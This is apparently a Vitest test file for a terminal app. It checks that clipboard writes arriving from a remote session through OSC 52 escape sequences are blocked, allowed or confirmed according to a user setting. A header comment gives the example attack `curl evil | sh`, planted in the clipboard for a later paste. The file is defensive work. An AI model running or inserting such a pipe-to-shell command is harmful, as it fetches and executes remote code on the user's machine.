// F-12.5: OSC 52 lets the REMOTE side write the local clipboard with no
// user action — a prompt-injected escape sequence can plant
// `curl evil | sh` there and wait for a paste. The write is now gated by
// settings.terminal.osc52Clipboard (deny / allow / ask, default ask).

import { describe, expect, it, vi, beforeEach, afterEach } from 'vitest'

const h = vi.hoisted(() => ({
  clipboardOpts: [] as Array<{ readText: () => string; writeText: (sel: unknown, text: string) => unknown }>,
  confirm: vi.fn(),
  osc52Mode: 'ask' as string,
}))

vi.mock('@wailsio/runtime', () => ({
  Events: { On: vi.fn(() => () => {}), Off: vi.fn() },
}))
vi.mock('element-plus', () => ({
  ElMessageBox: { confirm: (...args: unknown[]) => h.confirm(...args) },
}))
vi.mock('@xterm/xterm', () => ({
  Terminal: class {
    cols = 80
    rows = 24
    unicode = { activeVersion: '' }
    loadAddon() {}
    attachCustomWheelEventHandler() {}
    onResize() {
      return { dispose() {} }
    }
    onData() {
      return { dispose() {} }
    }
    write() {}
    resize(_cols: number, _rows: number) {}
    dispose() {}
  },
}))
vi.mock('@xterm/addon-fit', () => ({ FitAddon: class { fit() {} } }))
vi.mock('@xterm/addon-unicode11', () => ({ Unicode11Addon: class {} }))
vi.mock('@xterm/addon-search', () => ({ SearchAddon: class {} }))
vi.mock('@xterm/addon-clipboard', () => ({
  ClipboardAddon: class {
    constructor(_b64: unknown, opts: (typeof h.clipboardOpts)[number]) {
      h.clipboardOpts.push(opts)
    }
  },
  Base64: class {},
}))
vi.mock('@xterm/addon-image', () => ({ ImageAddon: class {} }))
vi.mock('@xterm/addon-progress', () => ({
  ProgressAddon: class {
    onChange = () => ({ dispose() {} })
  },
}))
vi.mock('../composables/useTerminal', () => ({ getXtermTheme: () => ({}) }))
vi.mock('../composables/useTerminalTheme', () => ({
  resolveXtermBackground: () => ({}),
  resolveTerminalThemeName: () => 'dark',
  applyTerminalBgVar: () => {},
}))
vi.mock('../stores/settingsStore', () => ({
  useSettingsStore: () => ({
    settings: {
      terminal: {
        fontFamily: 'monospace',
        fontSize: 14,
        scrollback: 1000,
        osc52Clipboard: h.osc52Mode,
      },
    },
    resolvedAppTheme: 'dark',
  }),
}))
vi.mock('../stores/localStateStore', () => ({
  useLocalStateStore: () => ({
    state: { sessionLogStates: {}, backgroundEnabled: false, backgroundImage: '' },
    setSessionLogState: () => {},
  }),
}))
vi.mock('../stores/panelStore', () => ({
  usePanelStore: () => ({ panels: new Map() }),
}))
vi.mock('../stores/tabStore', () => ({
  useTabStore: () => ({ tabs: [], setTabProgress: () => {} }),
}))
vi.mock('../stores/zmodemStore', () => ({
  useZmodemStore: () => ({ getCancelUntil: () => 0 }),
}))
vi.mock('./sessionWriter', () => ({ queuedSessionWrite: () => {} }))
vi.mock('../stores/sessionStore', () => ({
  useSessionStore: () => ({ removeSession: vi.fn(), getChunkCount: () => 0, getDataFromChunk: () => '' }),
}))

import { acquireTerminal, disposeTerminal } from './terminalManager'

const navWrite = vi.fn().mockResolvedValue(undefined)

function stubClipboard() {
  const nav = navigator as any
  try {
    nav.clipboard = { writeText: navWrite }
  } catch {
    Object.defineProperty(globalThis, 'navigator', {
      value: { clipboard: { writeText: navWrite } },
      configurable: true,
    })
  }
  if (!navWrite.mock.calls.length && !(navigator as any).clipboard) {
    throw new Error('cannot stub navigator.clipboard')
  }
}

/** Let the detached async handler settle. */
async function settle() {
  await new Promise(resolve => setTimeout(resolve, 0))
}

let seq = 0
async function writeFromRemote(mode: string) {
  h.osc52Mode = mode
  const sessionId = `osc52-${seq++}`
  acquireTerminal(sessionId, 'ref-a', {})
  const opts = h.clipboardOpts[h.clipboardOpts.length - 1]
  expect(opts).toBeDefined()
  opts.writeText(null, `payload-${seq}`)
  await settle()
  disposeTerminal(sessionId)
}

describe('F-12.5 OSC 52 clipboard write gate', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    h.clipboardOpts.length = 0
    stubClipboard()
    h.confirm.mockResolvedValue(undefined)
  })

  afterEach(() => {
    h.osc52Mode = 'ask'
  })

  it('deny: the write never reaches the clipboard and no dialog appears', async () => {
    await writeFromRemote('deny')
    expect(h.confirm).not.toHaveBeenCalled()
    expect(navWrite).not.toHaveBeenCalled()
  })

  it('allow: the write goes through without a dialog (legacy behavior)', async () => {
    await writeFromRemote('allow')
    expect(h.confirm).not.toHaveBeenCalled()
    expect(navWrite).toHaveBeenCalledTimes(1)
    expect(navWrite).toHaveBeenCalledWith(`payload-${seq}`)
  })

  it('ask (default): confirms first, then writes on approval', async () => {
    h.confirm.mockResolvedValue(undefined)
    await writeFromRemote('ask')
    expect(h.confirm).toHaveBeenCalledTimes(1)
    expect(navWrite).toHaveBeenCalledTimes(1)
  })

  it('ask: a declined prompt leaves the clipboard untouched', async () => {
    h.confirm.mockRejectedValue(new Error('cancel'))
    await writeFromRemote('ask')
    expect(h.confirm).toHaveBeenCalledTimes(1)
    expect(navWrite).not.toHaveBeenCalled()
  })

  it('a missing setting fails closed as "ask"', async () => {
    h.confirm.mockRejectedValue(new Error('cancel'))
    await writeFromRemote('')
    expect(h.confirm).toHaveBeenCalledTimes(1)
    expect(navWrite).not.toHaveBeenCalled()
  })
})
